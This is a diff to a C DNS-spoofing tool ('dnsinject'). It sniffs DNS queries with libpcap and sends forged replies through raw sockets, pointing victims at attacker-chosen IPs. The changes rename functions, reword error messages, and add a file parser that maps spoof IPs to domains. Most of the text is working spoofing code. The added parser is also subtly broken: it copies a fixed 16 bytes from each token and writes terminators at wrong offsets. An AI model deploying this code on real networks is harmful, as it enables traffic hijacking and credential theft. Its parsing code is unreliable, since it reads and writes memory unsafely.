@@ -51,6 +51,13 @@ struct dns_question {
 };
 
 
+// Link list node for file option
+struct node {
+	char spoof_ip[32];
+	char spoof_domain[150];
+	struct node *next;
+};
+
 /*
  * http://www.microhowto.info/howto/get_the_ip_address_of_a_network_interface_in_c_using_siocgifaddr.html
  */
@@ -110,13 +117,13 @@ unsigned short find_checksum(unsigned short *buf, int len) {
  * Sends a dns answer using raw sockets
  * http://www.binarytides.com/raw-sockets-c-code-linux/
  */
-void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
+void send_dns_reply(char* ip, u_int16_t port, char* packet, int packlen) {
 	struct sockaddr_in to_addr;
 	int bytes_sent, sock, one = 1;
 
 	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 	if (sock < 0) {
-		fprintf(stderr, "Error creating socket");
+		fprintf(stderr, "Error: Could not create socket!\n");
 		return;
 	}
 
@@ -125,13 +132,13 @@ void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
 	to_addr.sin_addr.s_addr = inet_addr(ip);
 
 	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-		fprintf(stderr, "Error at setsockopt()");
+		fprintf(stderr, "Error: Could not set socket port!\n");
 		return;
 	}
 
 	bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
 	if (bytes_sent < 0)
-		fprintf(stderr, "Error sending data");
+		fprintf(stderr, "Error: Could not send data!\n");
 }
 
 
@@ -152,7 +159,7 @@ void dns_spoof(unsigned char *args, const struct pcap_pkthdr *header, const u_ch
 	int size, i = 1, j = 0, k;
 	unsigned int reply_packet_size;
 	char spoof_ip[32], *reply;
-	unsigned char ans[4];
+	unsigned char split_ip[4];
 	struct in_addr dest, src;
 
 
@@ -179,6 +186,7 @@ void dns_spoof(unsigned char *args, const struct pcap_pkthdr *header, const u_ch
 	question.qname = ((char*) dns_hdr) + sizeof(struct dns_header);
 
 	// parse domain name
+	// [3]www[7]example[3]com -> www.example.com
 	domain_name = question.qname;
 	size = domain_name[0];
 	while (size > 0) {
@@ -210,8 +218,8 @@ void dns_spoof(unsigned char *args, const struct pcap_pkthdr *header, const u_ch
 	// reply dns_answer
 	memcpy(&reply[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
 	size += 12;
-	sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&ans[0], (int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
-	memcpy(&reply[size], ans, 4);
+	sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&split_ip[0], (int *)&split_ip[1], (int *)&split_ip[2], (int *)&split_ip[3]);
+	memcpy(&reply[size], split_ip, 4);
 	size += 4;
 
 	reply_packet_size = size;
@@ -243,10 +251,12 @@ void dns_spoof(unsigned char *args, const struct pcap_pkthdr *header, const u_ch
 	reply_packet_size += (sizeof(struct ip) + sizeof(struct udphdr));
 
 	/* sends our dns spoof msg */
-	send_dns_answer(src_ip, ntohs((*(u_int16_t*)&udp)), reply_packet, reply_packet_size);
+	send_dns_reply(src_ip, ntohs((*(u_int16_t*)&udp)), reply_packet, reply_packet_size);
 	// // printf("%s\n", datagram);
 	printf("Spoofed %s requested from %s\n", request, src_ip);
 }
+
+
 
 
 int main(int argc, char *argv[])
@@ -266,6 +276,12 @@ int main(int argc, char *argv[])
 	int option = 0;					/* for switching on getopt */
 	unsigned char *filter_str = NULL;		/* filter string */
 	char *file_name;				/* filename for read option */
+	struct node *head, *current, *free_this;
+	char *line = NULL;
+	size_t len = 0;
+	ssize_t read;
+	char delimiter[] = " \t\n";
+	char *token;
 
 
 	memset(errbuf, 0, PCAP_ERRBUF_SIZE);
@@ -292,7 +308,7 @@ int main(int argc, char *argv[])
 			read_file = 1;
 			break;
 		case 'h':
-			printf("help: mydump [-i interface] [-r file] [-s string] "
+			printf("help: dnsinject [-i interface] [-r file] [-s string] "
 			       "expression\n-i  Listen on network device <interface> "
 			       "(e.g., eth0). If not specified, mydump selects the default "
 			       "interface to listen on.\n-r  Read packets from <file>\n-s  "
@@ -323,6 +339,45 @@ int main(int argc, char *argv[])
 			exit(EXIT_FAILURE);
 		}
 	}
+
+	if (read_file == 1) {
+		FILE *fp = fopen(file_name, "r");
+		if (fp == 0) {
+			fprintf(stderr, "failed to open input.txt\n");
+			exit(EXIT_FAILURE);
+		}
+
+		head = current = NULL;
+		while ((read = getline(&line, &len, fp)) != -1) {
+			if (read <= 9) {
+				fprintf(stderr, "Malformed File.\n");
+				goto free_list;
+			}
+			struct node *new_node = malloc(sizeof(struct node));
+			token = strtok(line, delimiter);
+			memcpy(new_node->spoof_ip, token, 16);
+			new_node->spoof_ip[17] = '\0';
+			token = strtok(NULL, delimiter);
+			memcpy(new_node->spoof_domain, token, strlen(token));
+			new_node->spoof_domain[strlen(token) + 1] = '\0';
+			new_node->next = NULL;
+			if (head == NULL) {
+				current = head = new_node;
+			} else {
+				current->next = new_node;
+				current = current->next;
+			}
+		}
+		fclose(fp);
+	}
+
+
+	// current = head;
+	// while (current != NULL) {
+	// 	printf("%s\t%s\n", current->spoof_ip, current->spoof_domain);
+	// 	current = current->next;
+	// }
+
 
 	/*
 	 * get IPv4 network numbers and corresponding network mask
@@ -415,5 +470,14 @@ int main(int argc, char *argv[])
 	pcap_freecode(&fp);
 	pcap_close(handle);
 
+free_list:
+	if (read_file == 1) {
+		current = head;
+		while (current != NULL) {
+			free_this = current;
+			current = current->next;
+			free(free_this);
+		}
+	}
 	return 0;
 }
